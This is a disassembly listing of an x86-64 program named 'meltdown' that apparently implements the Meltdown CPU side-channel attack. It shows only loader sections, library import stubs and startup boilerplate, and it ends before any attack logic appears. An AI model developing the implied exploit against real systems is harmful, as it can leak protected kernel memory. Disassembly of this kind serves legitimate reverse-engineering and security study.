
meltdown:     file format elf64-x86-64


Disassembly of section .interp:

0000000000000238 <.interp>:
 238:	2f                   	(bad)  
 239:	6c                   	insb   (%dx),%es:(%rdi)
 23a:	69 62 36 34 2f 6c 64 	imul   $0x646c2f34,0x36(%rdx),%esp
 241:	2d 6c 69 6e 75       	sub    $0x756e696c,%eax
 246:	78 2d                	js     275 <_init-0x603>
 248:	78 38                	js     282 <_init-0x5f6>
 24a:	36 2d 36 34 2e 73    	ss sub $0x732e3436,%eax
 250:	6f                   	outsl  %ds:(%rsi),(%dx)
 251:	2e 32 00             	xor    %cs:(%rax),%al

Disassembly of section .note.ABI-tag:

0000000000000254 <.note.ABI-tag>:
 254:	04 00                	add    $0x0,%al
 256:	00 00                	add    %al,(%rax)
 258:	10 00                	adc    %al,(%rax)
 25a:	00 00                	add    %al,(%rax)
 25c:	01 00                	add    %eax,(%rax)
 25e:	00 00                	add    %al,(%rax)
 260:	47                   	rex.RXB
 261:	4e 55                	rex.WRX push %rbp
 263:	00 00                	add    %al,(%rax)
 265:	00 00                	add    %al,(%rax)
 267:	00 03                	add    %al,(%rbx)
 269:	00 00                	add    %al,(%rax)
 26b:	00 02                	add    %al,(%rdx)
 26d:	00 00                	add    %al,(%rax)
 26f:	00 00                	add    %al,(%rax)
 271:	00 00                	add    %al,(%rax)
	...

Disassembly of section .note.gnu.build-id:

0000000000000274 <.note.gnu.build-id>:
 274:	04 00                	add    $0x0,%al
 276:	00 00                	add    %al,(%rax)
 278:	14 00                	adc    $0x0,%al
 27a:	00 00                	add    %al,(%rax)
 27c:	03 00                	add    (%rax),%eax
 27e:	00 00                	add    %al,(%rax)
 280:	47                   	rex.RXB
 281:	4e 55                	rex.WRX push %rbp
 283:	00 60 c2             	add    %ah,-0x3e(%rax)
 286:	52                   	push   %rdx
 287:	8e 85 7c 14 c5 e9    	mov    -0x163aeb84(%rbp),%es
 28d:	22 18                	and    (%rax),%bl
 28f:	7e 18                	jle    2a9 <_init-0x5cf>
 291:	1b b1 72 06 4d 95    	sbb    -0x6ab2f98e(%rcx),%esi
 297:	fe                   	.byte 0xfe

Disassembly of section .gnu.hash:

0000000000000298 <.gnu.hash>:
 298:	01 00                	add    %eax,(%rax)
 29a:	00 00                	add    %al,(%rax)
 29c:	01 00                	add    %eax,(%rax)
 29e:	00 00                	add    %al,(%rax)
 2a0:	01 00                	add    %eax,(%rax)
	...

Disassembly of section .dynsym:

00000000000002b8 <.dynsym>:
	...
 2d0:	17                   	(bad)  
 2d1:	00 00                	add    %al,(%rax)
 2d3:	00 12                	add    %dl,(%rdx)
	...
 2e5:	00 00                	add    %al,(%rax)
 2e7:	00 b0 00 00 00 12    	add    %dh,0x12000000(%rax)
	...
 2fd:	00 00                	add    %al,(%rax)
 2ff:	00 cb                	add    %cl,%bl
 301:	00 00                	add    %al,(%rax)
 303:	00 20                	add    %ah,(%rax)
	...
 315:	00 00                	add    %al,(%rax)
 317:	00 12                	add    %dl,(%rdx)
 319:	00 00                	add    %al,(%rax)
 31b:	00 12                	add    %dl,(%rdx)
	...
 32d:	00 00                	add    %al,(%rax)
 32f:	00 2c 00             	add    %ch,(%rax,%rax,1)
 332:	00 00                	add    %al,(%rax)
 334:	12 00                	adc    (%rax),%al
	...
 346:	00 00                	add    %al,(%rax)
 348:	4b 00 00             	rex.WXB add %al,(%r8)
 34b:	00 12                	add    %dl,(%rdx)
	...
 35d:	00 00                	add    %al,(%rax)
 35f:	00 3d 00 00 00 12    	add    %bh,0x12000000(%rip)        # 12000365 <_end+0x11dfe25d>
	...
 375:	00 00                	add    %al,(%rax)
 377:	00 9e 00 00 00 12    	add    %bl,0x12000000(%rsi)
	...
 38d:	00 00                	add    %al,(%rax)
 38f:	00 66 00             	add    %ah,0x0(%rsi)
 392:	00 00                	add    %al,(%rax)
 394:	12 00                	adc    (%rax),%al
	...
 3a6:	00 00                	add    %al,(%rax)
 3a8:	0b 00                	or     (%rax),%eax
 3aa:	00 00                	add    %al,(%rax)
 3ac:	12 00                	adc    (%rax),%al
	...
 3be:	00 00                	add    %al,(%rax)
 3c0:	52                   	push   %rdx
 3c1:	00 00                	add    %al,(%rax)
 3c3:	00 12                	add    %dl,(%rdx)
	...
 3d5:	00 00                	add    %al,(%rax)
 3d7:	00 e7                	add    %ah,%bh
 3d9:	00 00                	add    %al,(%rax)
 3db:	00 20                	add    %ah,(%rax)
	...
 3ed:	00 00                	add    %al,(%rax)
 3ef:	00 23                	add    %ah,(%rbx)
 3f1:	00 00                	add    %al,(%rax)
 3f3:	00 12                	add    %dl,(%rdx)
	...
 405:	00 00                	add    %al,(%rax)
 407:	00 78 00             	add    %bh,0x0(%rax)
 40a:	00 00                	add    %al,(%rax)
 40c:	12 00                	adc    (%rax),%al
	...
 41e:	00 00                	add    %al,(%rax)
 420:	5e                   	pop    %rsi
 421:	00 00                	add    %al,(%rax)
 423:	00 12                	add    %dl,(%rdx)
	...
 435:	00 00                	add    %al,(%rax)
 437:	00 84 00 00 00 12 00 	add    %al,0x120000(%rax,%rax,1)
	...
 44e:	00 00                	add    %al,(%rax)
 450:	7f 00                	jg     452 <_init-0x426>
 452:	00 00                	add    %al,(%rax)
 454:	12 00                	adc    (%rax),%al
	...
 466:	00 00                	add    %al,(%rax)
 468:	98                   	cwtl   
 469:	00 00                	add    %al,(%rax)
 46b:	00 12                	add    %dl,(%rdx)
	...
 47d:	00 00                	add    %al,(%rax)
 47f:	00 f6                	add    %dh,%dh
 481:	00 00                	add    %al,(%rax)
 483:	00 20                	add    %ah,(%rax)
	...
 495:	00 00                	add    %al,(%rax)
 497:	00 89 00 00 00 22    	add    %cl,0x22000000(%rcx)
	...
 4ad:	00 00                	add    %al,(%rax)
 4af:	00 6e 00             	add    %ch,0x0(%rsi)
 4b2:	00 00                	add    %al,(%rax)
 4b4:	12 00                	adc    (%rax),%al
	...

Disassembly of section .dynstr:

00000000000004c8 <.dynstr>:
 4c8:	00 6c 69 62          	add    %ch,0x62(%rcx,%rbp,2)
 4cc:	63 2e                	movslq (%rsi),%ebp
 4ce:	73 6f                	jae    53f <_init-0x339>
 4d0:	2e 36 00 73 69       	cs add %dh,%ss:0x69(%rbx)
 4d5:	67 6e                	outsb  %ds:(%esi),(%dx)
 4d7:	61                   	(bad)  
 4d8:	6c                   	insb   (%dx),%es:(%rdi)
 4d9:	00 70 75             	add    %dh,0x75(%rax)
 4dc:	74 73                	je     551 <_init-0x327>
 4de:	00 73 69             	add    %dh,0x69(%rbx)
 4e1:	67 70 72             	addr32 jo 556 <_init-0x322>
 4e4:	6f                   	outsl  %ds:(%rsi),(%dx)
 4e5:	63 6d 61             	movslq 0x61(%rbp),%ebp
 4e8:	73 6b                	jae    555 <_init-0x323>
 4ea:	00 6d 65             	add    %ch,0x65(%rbp)
 4ed:	6d                   	insl   (%dx),%es:(%rdi)
 4ee:	61                   	(bad)  
 4ef:	6c                   	insb   (%dx),%es:(%rdi)
 4f0:	69 67 6e 00 5f 5f 73 	imul   $0x735f5f00,0x6e(%rdi),%esp
 4f7:	74 61                	je     55a <_init-0x31e>
 4f9:	63 6b 5f             	movslq 0x5f(%rbx),%ebp
 4fc:	63 68 6b             	movslq 0x6b(%rax),%ebp
 4ff:	5f                   	pop    %rdi
 500:	66 61                	data16 (bad) 
 502:	69 6c 00 5f 5f 61 73 	imul   $0x7373615f,0x5f(%rax,%rax,1),%ebp
 509:	73 
 50a:	65 72 74             	gs jb  581 <_init-0x2f7>
 50d:	5f                   	pop    %rdi
 50e:	66 61                	data16 (bad) 
 510:	69 6c 00 70 72 69 6e 	imul   $0x746e6972,0x70(%rax,%rax,1),%ebp
 517:	74 
 518:	66 00 73 69          	data16 add %dh,0x69(%rbx)
 51c:	67 65 6d             	gs insl (%dx),%es:(%edi)
 51f:	70 74                	jo     595 <_init-0x2e3>
 521:	79 73                	jns    596 <_init-0x2e2>
 523:	65 74 00             	gs je  526 <_init-0x352>
 526:	6c                   	insb   (%dx),%es:(%rdi)
 527:	6f                   	outsl  %ds:(%rsi),(%dx)
 528:	6e                   	outsb  %ds:(%rsi),(%dx)
 529:	67 6a 6d             	addr32 pushq $0x6d
 52c:	70 00                	jo     52e <_init-0x34a>
 52e:	5f                   	pop    %rdi
 52f:	73 65                	jae    596 <_init-0x2e2>
 531:	74 6a                	je     59d <_init-0x2db>
 533:	6d                   	insl   (%dx),%es:(%rdi)
 534:	70 00                	jo     536 <_init-0x342>
 536:	73 69                	jae    5a1 <_init-0x2d7>
 538:	67 61                	addr32 (bad) 
 53a:	64 64 73 65          	fs fs jae 5a3 <_init-0x2d5>
 53e:	74 00                	je     540 <_init-0x338>
 540:	6d                   	insl   (%dx),%es:(%rdi)
 541:	61                   	(bad)  
 542:	6c                   	insb   (%dx),%es:(%rdi)
 543:	6c                   	insb   (%dx),%es:(%rdi)
 544:	6f                   	outsl  %ds:(%rsi),(%dx)
 545:	63 00                	movslq (%rax),%eax
 547:	61                   	(bad)  
 548:	74 6f                	je     5b9 <_init-0x2bf>
 54a:	69 00 6f 70 65 6e    	imul   $0x6e65706f,(%rax),%eax
 550:	00 5f 5f             	add    %bl,0x5f(%rdi)
 553:	63 78 61             	movslq 0x61(%rax),%edi
 556:	5f                   	pop    %rdi
 557:	66 69 6e 61 6c 69    	imul   $0x696c,0x61(%rsi),%bp
 55d:	7a 65                	jp     5c4 <_init-0x2b4>
 55f:	00 70 72             	add    %dh,0x72(%rax)
 562:	65 61                	gs (bad) 
 564:	64 00 5f 5f          	add    %bl,%fs:0x5f(%rdi)
 568:	6c                   	insb   (%dx),%es:(%rdi)
 569:	69 62 63 5f 73 74 61 	imul   $0x6174735f,0x63(%rdx),%esp
 570:	72 74                	jb     5e6 <_init-0x292>
 572:	5f                   	pop    %rdi
 573:	6d                   	insl   (%dx),%es:(%rdi)
 574:	61                   	(bad)  
 575:	69 6e 00 66 72 65 65 	imul   $0x65657266,0x0(%rsi),%ebp
 57c:	00 47 4c             	add    %al,0x4c(%rdi)
 57f:	49                   	rex.WB
 580:	42                   	rex.X
 581:	43 5f                	rex.XB pop %r15
 583:	32 2e                	xor    (%rsi),%ch
 585:	34 00                	xor    $0x0,%al
 587:	47                   	rex.RXB
 588:	4c                   	rex.WR
 589:	49                   	rex.WB
 58a:	42                   	rex.X
 58b:	43 5f                	rex.XB pop %r15
 58d:	32 2e                	xor    (%rsi),%ch
 58f:	32 2e                	xor    (%rsi),%ch
 591:	35 00 5f 49 54       	xor    $0x54495f00,%eax
 596:	4d 5f                	rex.WRB pop %r15
 598:	64 65 72 65          	fs gs jb 601 <_init-0x277>
 59c:	67 69 73 74 65 72 54 	imul   $0x4d547265,0x74(%ebx),%esi
 5a3:	4d 
 5a4:	43 6c                	rex.XB insb (%dx),%es:(%rdi)
 5a6:	6f                   	outsl  %ds:(%rsi),(%dx)
 5a7:	6e                   	outsb  %ds:(%rsi),(%dx)
 5a8:	65 54                	gs push %rsp
 5aa:	61                   	(bad)  
 5ab:	62                   	(bad)  
 5ac:	6c                   	insb   (%dx),%es:(%rdi)
 5ad:	65 00 5f 5f          	add    %bl,%gs:0x5f(%rdi)
 5b1:	67 6d                	insl   (%dx),%es:(%edi)
 5b3:	6f                   	outsl  %ds:(%rsi),(%dx)
 5b4:	6e                   	outsb  %ds:(%rsi),(%dx)
 5b5:	5f                   	pop    %rdi
 5b6:	73 74                	jae    62c <_init-0x24c>
 5b8:	61                   	(bad)  
 5b9:	72 74                	jb     62f <_init-0x249>
 5bb:	5f                   	pop    %rdi
 5bc:	5f                   	pop    %rdi
 5bd:	00 5f 49             	add    %bl,0x49(%rdi)
 5c0:	54                   	push   %rsp
 5c1:	4d 5f                	rex.WRB pop %r15
 5c3:	72 65                	jb     62a <_init-0x24e>
 5c5:	67 69 73 74 65 72 54 	imul   $0x4d547265,0x74(%ebx),%esi
 5cc:	4d 
 5cd:	43 6c                	rex.XB insb (%dx),%es:(%rdi)
 5cf:	6f                   	outsl  %ds:(%rsi),(%dx)
 5d0:	6e                   	outsb  %ds:(%rsi),(%dx)
 5d1:	65 54                	gs push %rsp
 5d3:	61                   	(bad)  
 5d4:	62                   	.byte 0x62
 5d5:	6c                   	insb   (%dx),%es:(%rdi)
 5d6:	65                   	gs
	...

Disassembly of section .gnu.version:

00000000000005d8 <.gnu.version>:
 5d8:	00 00                	add    %al,(%rax)
 5da:	02 00                	add    (%rax),%al
 5dc:	02 00                	add    (%rax),%al
 5de:	00 00                	add    %al,(%rax)
 5e0:	02 00                	add    (%rax),%al
 5e2:	03 00                	add    (%rax),%eax
 5e4:	02 00                	add    (%rax),%al
 5e6:	02 00                	add    (%rax),%al
 5e8:	02 00                	add    (%rax),%al
 5ea:	02 00                	add    (%rax),%al
 5ec:	02 00                	add    (%rax),%al
 5ee:	02 00                	add    (%rax),%al
 5f0:	00 00                	add    %al,(%rax)
 5f2:	02 00                	add    (%rax),%al
 5f4:	02 00                	add    (%rax),%al
 5f6:	02 00                	add    (%rax),%al
 5f8:	02 00                	add    (%rax),%al
 5fa:	02 00                	add    (%rax),%al
 5fc:	02 00                	add    (%rax),%al
 5fe:	00 00                	add    %al,(%rax)
 600:	02 00                	add    (%rax),%al
 602:	02 00                	add    (%rax),%al

Disassembly of section .gnu.version_r:

0000000000000608 <.gnu.version_r>:
 608:	01 00                	add    %eax,(%rax)
 60a:	02 00                	add    (%rax),%al
 60c:	01 00                	add    %eax,(%rax)
 60e:	00 00                	add    %al,(%rax)
 610:	10 00                	adc    %al,(%rax)
 612:	00 00                	add    %al,(%rax)
 614:	00 00                	add    %al,(%rax)
 616:	00 00                	add    %al,(%rax)
 618:	14 69                	adc    $0x69,%al
 61a:	69 0d 00 00 03 00 b5 	imul   $0xb5,0x30000(%rip),%ecx        # 30624 <__FRAME_END__+0x2e900>
 621:	00 00 00 
 624:	10 00                	adc    %al,(%rax)
 626:	00 00                	add    %al,(%rax)
 628:	75 1a                	jne    644 <_init-0x234>
 62a:	69 09 00 00 02 00    	imul   $0x20000,(%rcx),%ecx
 630:	bf 00 00 00 00       	mov    $0x0,%edi
 635:	00 00                	add    %al,(%rax)
	...

Disassembly of section .rela.dyn:

0000000000000638 <.rela.dyn>:
 638:	40 1d 20 00 00 00    	rex sbb $0x20,%eax
 63e:	00 00                	add    %al,(%rax)
 640:	08 00                	or     %al,(%rax)
 642:	00 00                	add    %al,(%rax)
 644:	00 00                	add    %al,(%rax)
 646:	00 00                	add    %al,(%rax)
 648:	b0 0a                	mov    $0xa,%al
 64a:	00 00                	add    %al,(%rax)
 64c:	00 00                	add    %al,(%rax)
 64e:	00 00                	add    %al,(%rax)
 650:	48 1d 20 00 00 00    	sbb    $0x20,%rax
 656:	00 00                	add    %al,(%rax)
 658:	08 00                	or     %al,(%rax)
 65a:	00 00                	add    %al,(%rax)
 65c:	00 00                	add    %al,(%rax)
 65e:	00 00                	add    %al,(%rax)
 660:	70 0a                	jo     66c <_init-0x20c>
 662:	00 00                	add    %al,(%rax)
 664:	00 00                	add    %al,(%rax)
 666:	00 00                	add    %al,(%rax)
 668:	08 20                	or     %ah,(%rax)
 66a:	20 00                	and    %al,(%rax)
 66c:	00 00                	add    %al,(%rax)
 66e:	00 00                	add    %al,(%rax)
 670:	08 00                	or     %al,(%rax)
 672:	00 00                	add    %al,(%rax)
 674:	00 00                	add    %al,(%rax)
 676:	00 00                	add    %al,(%rax)
 678:	08 20                	or     %ah,(%rax)
 67a:	20 00                	and    %al,(%rax)
 67c:	00 00                	add    %al,(%rax)
 67e:	00 00                	add    %al,(%rax)
 680:	d8 1f                	fcomps (%rdi)
 682:	20 00                	and    %al,(%rax)
 684:	00 00                	add    %al,(%rax)
 686:	00 00                	add    %al,(%rax)
 688:	06                   	(bad)  
 689:	00 00                	add    %al,(%rax)
 68b:	00 03                	add    %al,(%rbx)
	...
 695:	00 00                	add    %al,(%rax)
 697:	00 e0                	add    %ah,%al
 699:	1f                   	(bad)  
 69a:	20 00                	and    %al,(%rax)
 69c:	00 00                	add    %al,(%rax)
 69e:	00 00                	add    %al,(%rax)
 6a0:	06                   	(bad)  
 6a1:	00 00                	add    %al,(%rax)
 6a3:	00 08                	add    %cl,(%rax)
	...
 6ad:	00 00                	add    %al,(%rax)
 6af:	00 e8                	add    %ch,%al
 6b1:	1f                   	(bad)  
 6b2:	20 00                	and    %al,(%rax)
 6b4:	00 00                	add    %al,(%rax)
 6b6:	00 00                	add    %al,(%rax)
 6b8:	06                   	(bad)  
 6b9:	00 00                	add    %al,(%rax)
 6bb:	00 0c 00             	add    %cl,(%rax,%rax,1)
	...
 6c6:	00 00                	add    %al,(%rax)
 6c8:	f0 1f                	lock (bad) 
 6ca:	20 00                	and    %al,(%rax)
 6cc:	00 00                	add    %al,(%rax)
 6ce:	00 00                	add    %al,(%rax)
 6d0:	06                   	(bad)  
 6d1:	00 00                	add    %al,(%rax)
 6d3:	00 13                	add    %dl,(%rbx)
	...
 6dd:	00 00                	add    %al,(%rax)
 6df:	00 f8                	add    %bh,%al
 6e1:	1f                   	(bad)  
 6e2:	20 00                	and    %al,(%rax)
 6e4:	00 00                	add    %al,(%rax)
 6e6:	00 00                	add    %al,(%rax)
 6e8:	06                   	(bad)  
 6e9:	00 00                	add    %al,(%rax)
 6eb:	00 14 00             	add    %dl,(%rax,%rax,1)
	...

Disassembly of section .rela.plt:

00000000000006f8 <.rela.plt>:
 6f8:	58                   	pop    %rax
 6f9:	1f                   	(bad)  
 6fa:	20 00                	and    %al,(%rax)
 6fc:	00 00                	add    %al,(%rax)
 6fe:	00 00                	add    %al,(%rax)
 700:	07                   	(bad)  
 701:	00 00                	add    %al,(%rax)
 703:	00 01                	add    %al,(%rcx)
	...
 70d:	00 00                	add    %al,(%rax)
 70f:	00 60 1f             	add    %ah,0x1f(%rax)
 712:	20 00                	and    %al,(%rax)
 714:	00 00                	add    %al,(%rax)
 716:	00 00                	add    %al,(%rax)
 718:	07                   	(bad)  
 719:	00 00                	add    %al,(%rax)
 71b:	00 02                	add    %al,(%rdx)
	...
 725:	00 00                	add    %al,(%rax)
 727:	00 68 1f             	add    %ch,0x1f(%rax)
 72a:	20 00                	and    %al,(%rax)
 72c:	00 00                	add    %al,(%rax)
 72e:	00 00                	add    %al,(%rax)
 730:	07                   	(bad)  
 731:	00 00                	add    %al,(%rax)
 733:	00 04 00             	add    %al,(%rax,%rax,1)
	...
 73e:	00 00                	add    %al,(%rax)
 740:	70 1f                	jo     761 <_init-0x117>
 742:	20 00                	and    %al,(%rax)
 744:	00 00                	add    %al,(%rax)
 746:	00 00                	add    %al,(%rax)
 748:	07                   	(bad)  
 749:	00 00                	add    %al,(%rax)
 74b:	00 05 00 00 00 00    	add    %al,0x0(%rip)        # 751 <_init-0x127>
 751:	00 00                	add    %al,(%rax)
 753:	00 00                	add    %al,(%rax)
 755:	00 00                	add    %al,(%rax)
 757:	00 78 1f             	add    %bh,0x1f(%rax)
 75a:	20 00                	and    %al,(%rax)
 75c:	00 00                	add    %al,(%rax)
 75e:	00 00                	add    %al,(%rax)
 760:	07                   	(bad)  
 761:	00 00                	add    %al,(%rax)
 763:	00 06                	add    %al,(%rsi)
	...
 76d:	00 00                	add    %al,(%rax)
 76f:	00 80 1f 20 00 00    	add    %al,0x201f(%rax)
 775:	00 00                	add    %al,(%rax)
 777:	00 07                	add    %al,(%rdi)
 779:	00 00                	add    %al,(%rax)
 77b:	00 07                	add    %al,(%rdi)
	...
 785:	00 00                	add    %al,(%rax)
 787:	00 88 1f 20 00 00    	add    %cl,0x201f(%rax)
 78d:	00 00                	add    %al,(%rax)
 78f:	00 07                	add    %al,(%rdi)
 791:	00 00                	add    %al,(%rax)
 793:	00 09                	add    %cl,(%rcx)
	...
 79d:	00 00                	add    %al,(%rax)
 79f:	00 90 1f 20 00 00    	add    %dl,0x201f(%rax)
 7a5:	00 00                	add    %al,(%rax)
 7a7:	00 07                	add    %al,(%rdi)
 7a9:	00 00                	add    %al,(%rax)
 7ab:	00 0a                	add    %cl,(%rdx)
	...
 7b5:	00 00                	add    %al,(%rax)
 7b7:	00 98 1f 20 00 00    	add    %bl,0x201f(%rax)
 7bd:	00 00                	add    %al,(%rax)
 7bf:	00 07                	add    %al,(%rdi)
 7c1:	00 00                	add    %al,(%rax)
 7c3:	00 0b                	add    %cl,(%rbx)
	...
 7cd:	00 00                	add    %al,(%rax)
 7cf:	00 a0 1f 20 00 00    	add    %ah,0x201f(%rax)
 7d5:	00 00                	add    %al,(%rax)
 7d7:	00 07                	add    %al,(%rdi)
 7d9:	00 00                	add    %al,(%rax)
 7db:	00 0d 00 00 00 00    	add    %cl,0x0(%rip)        # 7e1 <_init-0x97>
 7e1:	00 00                	add    %al,(%rax)
 7e3:	00 00                	add    %al,(%rax)
 7e5:	00 00                	add    %al,(%rax)
 7e7:	00 a8 1f 20 00 00    	add    %ch,0x201f(%rax)
 7ed:	00 00                	add    %al,(%rax)
 7ef:	00 07                	add    %al,(%rdi)
 7f1:	00 00                	add    %al,(%rax)
 7f3:	00 0e                	add    %cl,(%rsi)
	...
 7fd:	00 00                	add    %al,(%rax)
 7ff:	00 b0 1f 20 00 00    	add    %dh,0x201f(%rax)
 805:	00 00                	add    %al,(%rax)
 807:	00 07                	add    %al,(%rdi)
 809:	00 00                	add    %al,(%rax)
 80b:	00 0f                	add    %cl,(%rdi)
	...
 815:	00 00                	add    %al,(%rax)
 817:	00 b8 1f 20 00 00    	add    %bh,0x201f(%rax)
 81d:	00 00                	add    %al,(%rax)
 81f:	00 07                	add    %al,(%rdi)
 821:	00 00                	add    %al,(%rax)
 823:	00 10                	add    %dl,(%rax)
	...
 82d:	00 00                	add    %al,(%rax)
 82f:	00 c0                	add    %al,%al
 831:	1f                   	(bad)  
 832:	20 00                	and    %al,(%rax)
 834:	00 00                	add    %al,(%rax)
 836:	00 00                	add    %al,(%rax)
 838:	07                   	(bad)  
 839:	00 00                	add    %al,(%rax)
 83b:	00 11                	add    %dl,(%rcx)
	...
 845:	00 00                	add    %al,(%rax)
 847:	00 c8                	add    %cl,%al
 849:	1f                   	(bad)  
 84a:	20 00                	and    %al,(%rax)
 84c:	00 00                	add    %al,(%rax)
 84e:	00 00                	add    %al,(%rax)
 850:	07                   	(bad)  
 851:	00 00                	add    %al,(%rax)
 853:	00 12                	add    %dl,(%rdx)
	...
 85d:	00 00                	add    %al,(%rax)
 85f:	00 d0                	add    %dl,%al
 861:	1f                   	(bad)  
 862:	20 00                	and    %al,(%rax)
 864:	00 00                	add    %al,(%rax)
 866:	00 00                	add    %al,(%rax)
 868:	07                   	(bad)  
 869:	00 00                	add    %al,(%rax)
 86b:	00 15 00 00 00 00    	add    %dl,0x0(%rip)        # 871 <_init-0x7>
 871:	00 00                	add    %al,(%rax)
 873:	00 00                	add    %al,(%rax)
 875:	00 00                	add    %al,(%rax)
	...

Disassembly of section .init:

0000000000000878 <_init>:
 878:	48 83 ec 08          	sub    $0x8,%rsp
 87c:	48 8b 05 65 17 20 00 	mov    0x201765(%rip),%rax        # 201fe8 <__gmon_start__>
 883:	48 85 c0             	test   %rax,%rax
 886:	74 02                	je     88a <_init+0x12>
 888:	ff d0                	callq  *%rax
 88a:	48 83 c4 08          	add    $0x8,%rsp
 88e:	c3                   	retq   

Disassembly of section .plt:

0000000000000890 <.plt>:
 890:	ff 35 b2 16 20 00    	pushq  0x2016b2(%rip)        # 201f48 <_GLOBAL_OFFSET_TABLE_+0x8>
 896:	ff 25 b4 16 20 00    	jmpq   *0x2016b4(%rip)        # 201f50 <_GLOBAL_OFFSET_TABLE_+0x10>
 89c:	0f 1f 40 00          	nopl   0x0(%rax)

00000000000008a0 <sigprocmask@plt>:
 8a0:	ff 25 b2 16 20 00    	jmpq   *0x2016b2(%rip)        # 201f58 <sigprocmask@GLIBC_2.2.5>
 8a6:	68 00 00 00 00       	pushq  $0x0
 8ab:	e9 e0 ff ff ff       	jmpq   890 <.plt>

00000000000008b0 <free@plt>:
 8b0:	ff 25 aa 16 20 00    	jmpq   *0x2016aa(%rip)        # 201f60 <free@GLIBC_2.2.5>
 8b6:	68 01 00 00 00       	pushq  $0x1
 8bb:	e9 d0 ff ff ff       	jmpq   890 <.plt>

00000000000008c0 <puts@plt>:
 8c0:	ff 25 a2 16 20 00    	jmpq   *0x2016a2(%rip)        # 201f68 <puts@GLIBC_2.2.5>
 8c6:	68 02 00 00 00       	pushq  $0x2
 8cb:	e9 c0 ff ff ff       	jmpq   890 <.plt>

00000000000008d0 <__stack_chk_fail@plt>:
 8d0:	ff 25 9a 16 20 00    	jmpq   *0x20169a(%rip)        # 201f70 <__stack_chk_fail@GLIBC_2.4>
 8d6:	68 03 00 00 00       	pushq  $0x3
 8db:	e9 b0 ff ff ff       	jmpq   890 <.plt>

00000000000008e0 <printf@plt>:
 8e0:	ff 25 92 16 20 00    	jmpq   *0x201692(%rip)        # 201f78 <printf@GLIBC_2.2.5>
 8e6:	68 04 00 00 00       	pushq  $0x4
 8eb:	e9 a0 ff ff ff       	jmpq   890 <.plt>

00000000000008f0 <__assert_fail@plt>:
 8f0:	ff 25 8a 16 20 00    	jmpq   *0x20168a(%rip)        # 201f80 <__assert_fail@GLIBC_2.2.5>
 8f6:	68 05 00 00 00       	pushq  $0x5
 8fb:	e9 90 ff ff ff       	jmpq   890 <.plt>

0000000000000900 <_setjmp@plt>:
 900:	ff 25 82 16 20 00    	jmpq   *0x201682(%rip)        # 201f88 <_setjmp@GLIBC_2.2.5>
 906:	68 06 00 00 00       	pushq  $0x6
 90b:	e9 80 ff ff ff       	jmpq   890 <.plt>

0000000000000910 <signal@plt>:
 910:	ff 25 7a 16 20 00    	jmpq   *0x20167a(%rip)        # 201f90 <signal@GLIBC_2.2.5>
 916:	68 07 00 00 00       	pushq  $0x7
 91b:	e9 70 ff ff ff       	jmpq   890 <.plt>

0000000000000920 <sigemptyset@plt>:
 920:	ff 25 72 16 20 00    	jmpq   *0x201672(%rip)        # 201f98 <sigemptyset@GLIBC_2.2.5>
 926:	68 08 00 00 00       	pushq  $0x8
 92b:	e9 60 ff ff ff       	jmpq   890 <.plt>

0000000000000930 <memalign@plt>:
 930:	ff 25 6a 16 20 00    	jmpq   *0x20166a(%rip)        # 201fa0 <memalign@GLIBC_2.2.5>
 936:	68 09 00 00 00       	pushq  $0x9
 93b:	e9 50 ff ff ff       	jmpq   890 <.plt>

0000000000000940 <malloc@plt>:
 940:	ff 25 62 16 20 00    	jmpq   *0x201662(%rip)        # 201fa8 <malloc@GLIBC_2.2.5>
 946:	68 0a 00 00 00       	pushq  $0xa
 94b:	e9 40 ff ff ff       	jmpq   890 <.plt>

0000000000000950 <longjmp@plt>:
 950:	ff 25 5a 16 20 00    	jmpq   *0x20165a(%rip)        # 201fb0 <longjmp@GLIBC_2.2.5>
 956:	68 0b 00 00 00       	pushq  $0xb
 95b:	e9 30 ff ff ff       	jmpq   890 <.plt>

0000000000000960 <open@plt>:
 960:	ff 25 52 16 20 00    	jmpq   *0x201652(%rip)        # 201fb8 <open@GLIBC_2.2.5>
 966:	68 0c 00 00 00       	pushq  $0xc
 96b:	e9 20 ff ff ff       	jmpq   890 <.plt>

0000000000000970 <atoi@plt>:
 970:	ff 25 4a 16 20 00    	jmpq   *0x20164a(%rip)        # 201fc0 <atoi@GLIBC_2.2.5>
 976:	68 0d 00 00 00       	pushq  $0xd
 97b:	e9 10 ff ff ff       	jmpq   890 <.plt>

0000000000000980 <pread@plt>:
 980:	ff 25 42 16 20 00    	jmpq   *0x201642(%rip)        # 201fc8 <pread@GLIBC_2.2.5>
 986:	68 0e 00 00 00       	pushq  $0xe
 98b:	e9 00 ff ff ff       	jmpq   890 <.plt>

0000000000000990 <sigaddset@plt>:
 990:	ff 25 3a 16 20 00    	jmpq   *0x20163a(%rip)        # 201fd0 <sigaddset@GLIBC_2.2.5>
 996:	68 0f 00 00 00       	pushq  $0xf
 99b:	e9 f0 fe ff ff       	jmpq   890 <.plt>

Disassembly of section .plt.got:

00000000000009a0 <__cxa_finalize@plt>:
 9a0:	ff 25 52 16 20 00    	jmpq   *0x201652(%rip)        # 201ff8 <__cxa_finalize@GLIBC_2.2.5>
 9a6:	66 90                	xchg   %ax,%ax

Disassembly of section .text:

00000000000009b0 <_start>:
     9b0:	31 ed                	xor    %ebp,%ebp
     9b2:	49 89 d1             	mov    %rdx,%r9
     9b5:	5e                   	pop    %rsi
     9b6:	48 89 e2             	mov    %rsp,%rdx
     9b9:	48 83 e4 f0          	and    $0xfffffffffffffff0,%rsp
     9bd:	50                   	push   %rax
     9be:	54                   	push   %rsp
     9bf:	4c 8d 05 aa 0e 00 00 	lea    0xeaa(%rip),%r8        # 1870 <__libc_csu_fini>
     9c6:	48 8d 0d 33 0e 00 00 	lea    0xe33(%rip),%rcx        # 1800 <__libc_csu_init>
     9cd:	48 8d 3d 30 05 00 00 	lea    0x530(%rip),%rdi        # f04 <main>
     9d4:	ff 15 06 16 20 00    	callq  *0x201606(%rip)        # 201fe0 <__libc_start_main@GLIBC_2.2.5>
     9da:	f4                   	hlt    
     9db:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)

00000000000009e0 <deregister_tm_clones>:
     9e0:	48 8d 3d 29 16 20 00 	lea    0x201629(%rip),%rdi        # 202010 <__TMC_END__>
     9e7:	55                   	push   %rbp
     9e8:	48 8d 05 21 16 20 00 	lea    0x201621(%rip),%rax        # 202010 <__TMC_END__>
     9ef:	48 39 f8             	cmp    %rdi,%rax
     9f2:	48 89 e5             	mov    %rsp,%rbp
     9f5:	74 19                	je     a10 <deregister_tm_clones+0x30>
     9f7:	48 8b 05 da 15 20 00 	mov    0x2015da(%rip),%rax        # 201fd8 <_ITM_deregisterTMCloneTable>
